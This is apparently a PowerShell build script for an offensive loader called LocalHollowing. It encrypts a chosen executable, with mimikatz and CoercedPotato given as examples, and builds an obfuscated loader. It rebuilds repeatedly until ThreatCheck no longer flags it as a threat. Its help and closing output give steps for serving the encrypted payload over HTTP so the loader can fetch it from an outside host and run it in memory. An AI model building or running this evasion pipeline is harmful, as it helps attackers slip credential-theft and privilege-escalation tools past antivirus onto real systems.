# run.ps1 - Build LocalHollowing + encrypt payload in one command.

param(
    [string]$PE,
    [string]$Pass,
    [switch]$NoObf,
    [switch]$h,
    [string]$ThreatCheck = "C:\Users\chems\Desktop\ThreatCheck\ThreatCheck\bin\Release\ThreatCheck.exe",
    [int]$MaxAttempts = 10
)

# -- Help ---
if ($h -or (-not $PE -and -not $Pass)) {
    Write-Host ""
    Write-Host "  run.ps1 - Build LocalHollowing + encrypt payload" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  USAGE:" -ForegroundColor Cyan
    Write-Host "    .\run.ps1 -PE <path_to_exe> -Pass <passphrase> [-NoObf] [-MaxAttempts N]"
    Write-Host ""
    Write-Host "  OPTIONS:" -ForegroundColor Cyan
    Write-Host "    -PE            Path to the PE to encrypt (mimikatz, CoercedPotato, etc.)"
    Write-Host "    -Pass          Passphrase for AES-256 encryption (same at runtime)"
    Write-Host "    -NoObf         Skip OLLVM obfuscation (faster, for debug)"
    Write-Host "    -MaxAttempts   ThreatCheck retry limit (default: 10)"
    Write-Host "    -ThreatCheck   Path to ThreatCheck.exe (skipped if not found)"
    Write-Host "    -h             Show this help"
    Write-Host ""
    Write-Host "  EXAMPLES:" -ForegroundColor Cyan
    Write-Host "    .\run.ps1 -PE C:\tools\mimikatz.exe -Pass `"MySecret123`""
    Write-Host "    .\run.ps1 -PE .\CoercedPotato.exe -Pass `"test`" -NoObf"
    Write-Host ""
    Write-Host "  OUTPUT:" -ForegroundColor Cyan
    Write-Host "    build\LocalHollowing.exe   The loader"
    Write-Host "    build\payload.bin          Encrypted payload"
    Write-Host "    build\passphrase.txt       Last passphrase used"
    Write-Host ""
    Write-Host "  RUN THE PAYLOAD:" -ForegroundColor Cyan
    Write-Host "    python -m http.server 8080 --directory build"
    Write-Host "    .\build\LocalHollowing.exe http://<IP>:8080/payload.bin `"<passphrase>`""
    Write-Host ""
    exit 0
}

if (-not $PE)   { Write-Error "Missing -PE. Use -h for help."; exit 1 }
if (-not $Pass) { Write-Error "Missing -Pass. Use -h for help."; exit 1 }

$PROJECT_ROOT = $PSScriptRoot
$SOURCE_DIR   = Join-Path $PROJECT_ROOT "LocalHollowing"
$SCRIPTS_DIR  = Join-Path $PROJECT_ROOT "scripts"
$BUILD_DIR    = Join-Path $PROJECT_ROOT "build"
$CONFIG_JSON  = Join-Path $PROJECT_ROOT "config.json"
$OUTPUT_EXE   = Join-Path $BUILD_DIR   "LocalHollowing.exe"

# Resolve input PE path
if (-not [System.IO.Path]::IsPathRooted($PE)) {
    $PE = Join-Path (Get-Location) $PE
}
if (-not (Test-Path $PE)) {
    Write-Error "PE not found: $PE"
    exit 1
}

New-Item -ItemType Directory -Path $BUILD_DIR -Force | Out-Null

Write-Host ""
Write-Host "=== LocalHollowing ===" -ForegroundColor Yellow
Write-Host ""

# -- 1. Encrypt payload ---
$peSize = [math]::Round((Get-Item $PE).Length / 1KB, 1)
Write-Host "[1/3] Encrypt: $(Split-Path $PE -Leaf) ($peSize KB)" -ForegroundColor Cyan
python "$SCRIPTS_DIR\encrypt_and_convert.py" $PE $BUILD_DIR --passphrase "$Pass"
if ($LASTEXITCODE -ne 0) { Write-Error "Encryption failed"; exit 1 }

# -- 2. Generate resolve.h ---
Write-Host "[2/3] Generate resolve.h" -ForegroundColor Cyan
python "$SCRIPTS_DIR\generate_resolve.py" $CONFIG_JSON $BUILD_DIR
if ($LASTEXITCODE -ne 0) { Write-Error "generate_resolve.py failed"; exit 1 }
Copy-Item "$BUILD_DIR\resolve.h" "$SOURCE_DIR\resolve.h" -Force

# -- 3. Build + ThreatCheck loop ---
$attempt  = 0
$cleanBin = $null

while ($attempt -lt $MaxAttempts) {
    $attempt++
    Write-Host "[3/3] Build (attempt $attempt/$MaxAttempts)" -ForegroundColor Cyan

    if ($NoObf) { & "$SCRIPTS_DIR\build.ps1" -NoObf }
    else        { & "$SCRIPTS_DIR\build.ps1" }
    if ($LASTEXITCODE -ne 0) { Write-Error "Build failed"; exit 1 }

    python "$SCRIPTS_DIR\patch_pe.py" "$OUTPUT_EXE" 2>$null

    if (-not (Test-Path $ThreatCheck)) {
        $cleanBin = $OUTPUT_EXE
        break
    }

    $fullPath = (Resolve-Path $OUTPUT_EXE).ProviderPath
    $tcOutput = & $ThreatCheck -f "$fullPath" 2>&1

    if ($tcOutput -match "No threat found") {
        Write-Host "    ThreatCheck: CLEAN" -ForegroundColor Green
        $cleanBin = $OUTPUT_EXE
        break
    } else {
        Write-Host "    Detected - retrying..." -ForegroundColor Red
    }
}

if (-not $cleanBin) {
    Write-Error "All $MaxAttempts attempts flagged. Manual tuning required."
    exit 1
}

# -- Cleanup intermediates ---
Remove-Item "$BUILD_DIR\resolve.h"   -Force -ErrorAction SilentlyContinue
Remove-Item "$BUILD_DIR\*.obj"       -Force -ErrorAction SilentlyContinue
Remove-Item "$BUILD_DIR\*.rc"        -Force -ErrorAction SilentlyContinue
Remove-Item "$BUILD_DIR\*.res"       -Force -ErrorAction SilentlyContinue

# -- Save passphrase ---
$Pass | Out-File -FilePath "$BUILD_DIR\passphrase.txt" -Encoding UTF8 -NoNewline

# -- Done ---
Write-Host ""
Write-Host "=== Done ===" -ForegroundColor Green
$exeKB = [math]::Round((Get-Item $OUTPUT_EXE).Length / 1KB, 1)
$binKB = [math]::Round((Get-Item "$BUILD_DIR\payload.bin").Length / 1KB, 1)
Write-Host "  build\LocalHollowing.exe  ($exeKB KB)" -ForegroundColor White
Write-Host "  build\payload.bin         ($binKB KB)" -ForegroundColor White
Write-Host "  build\passphrase.txt" -ForegroundColor White
Write-Host ""
Write-Host "Run:" -ForegroundColor Yellow
Write-Host "  python -m http.server 8080 --directory build" -ForegroundColor Gray
Write-Host "  .\build\LocalHollowing.exe http://<IP>:8080/payload.bin `"$Pass`"" -ForegroundColor Gray
Write-Host ""
